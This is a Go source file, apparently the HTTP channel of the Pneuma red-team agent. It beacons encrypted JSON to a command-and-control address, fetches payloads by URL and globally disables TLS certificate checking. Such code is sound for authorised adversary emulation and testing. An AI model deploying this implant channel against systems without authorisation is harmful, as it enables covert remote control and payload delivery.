package sockets

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"errors"
	"github.com/preludeorg/pneuma/channels"
	"github.com/preludeorg/pneuma/util"
	"io/ioutil"
	"net/http"
	"net/url"
	"path"
	"time"
)

var UA *string

type HTTP struct{}

func init() {
	util.CommunicationChannels["http"] = HTTP{}
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
}

func (contact HTTP) Communicate(agent *util.AgentConfig, name string) (*util.Connection, error) {
	if _, err := checkValidHTTPTarget(agent.Contact["http"]); err != nil {
		return nil, err
	}

	setHTTPProxyConfiguration(agent)

	// Create the Envelope Send/Recv channels.
	send := make(chan *util.Envelope)
	recv := make(chan *util.Envelope)
	ctrl := make(chan bool)

	// Create the Connection to be returned to the caller.
	connection := &util.Connection{
		Name:   name,
		Type:   "http",
		Send:   send,
		Recv:   recv,
		Ctrl:   ctrl,
		IsOpen: true,
		Cleanup: func() {
			util.DebugLogf("[http] cleaning up connection.")
			close(send)
			ctrl <- true
			close(recv)
		},
	}

	// Write socket goroutine reads from the connection Send chan and writes to the socket.
	go func() {
		defer connection.Cleanup()
		for {
			envelope := <-send
			beaconPOST(agent.Contact["http"], connection, *envelope.Beacon)
		}
	}()

	go func() {
		defer connection.Cleanup()
		for {
			env := <-recv
			channels.Envelopes <- env
		}
	}()

	return connection, nil
}

func beaconPOST(address string, connection *util.Connection, beacon util.Beacon) {
	var b util.Beacon
	data, _ := json.Marshal(beacon)
	body, _, code, err := request(address, "POST", util.Encrypt(data))
	if len(body) > 0 && code == 200 && err == nil {
		err := json.Unmarshal([]byte(util.Decrypt(string(body))), &b)
		if err != nil {
			util.DebugLog("[-] Unable to decrypt HTTP message.")
		}

		envelope := util.BuildEnvelope(&beacon, connection)
		if envelope != nil {
			connection.Recv <- envelope
		}
	}
}

func request(address string, method string, data []byte) ([]byte, http.Header, int, error) {
	client := &http.Client{
		Timeout: time.Second * 20,
	}
	req, err := http.NewRequest(method, address, bytes.NewBuffer(data))
	if err != nil {
		util.DebugLog(err)
	}
	req.Close = true
	req.Header.Set("User-Agent", *UA)
	resp, err := client.Do(req)
	if err != nil {
		util.DebugLog(err)
		return nil, nil, 404, err
	}
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		util.DebugLog(err)
		return nil, nil, resp.StatusCode, err
	}
	err = resp.Body.Close()
	if err != nil {
		util.DebugLog(err)
		return nil, nil, resp.StatusCode, err
	}
	return body, resp.Header, resp.StatusCode, err
}

func checkValidHTTPTarget(address string) (bool, error) {
	u, err := url.Parse(address)
	if err != nil || u.Scheme == "" || u.Host == "" {
		util.DebugLogf("[%s] is an invalid URL for HTTP/S beacons", address)
		return false, errors.New("INVALID URL")
	}
	return true, nil
}

func setHTTPProxyConfiguration(agent *util.AgentConfig) {
	var proxyUrlFunc func(*http.Request) (*url.URL, error)

	if proxyUrl, err := url.Parse(agent.Proxy); err == nil && proxyUrl.Scheme != "" && proxyUrl.Host != "" {
		proxyUrlFunc = http.ProxyURL(proxyUrl)
	} else {
		proxyUrlFunc = http.ProxyFromEnvironment
	}

	http.DefaultTransport.(*http.Transport).Proxy = proxyUrlFunc
}

func requestHTTPPayload(address string) ([]byte, string, int, error) {
	valid, err := checkValidHTTPTarget(address)
	if valid {
		body, _, code, netErr := request(address, "GET", []byte{})
		if netErr != nil {
			return nil, "", code, netErr
		}
		if code == 200 {
			return body, path.Base(address), code, netErr
		}
	}
	return nil, "", 0, err
}
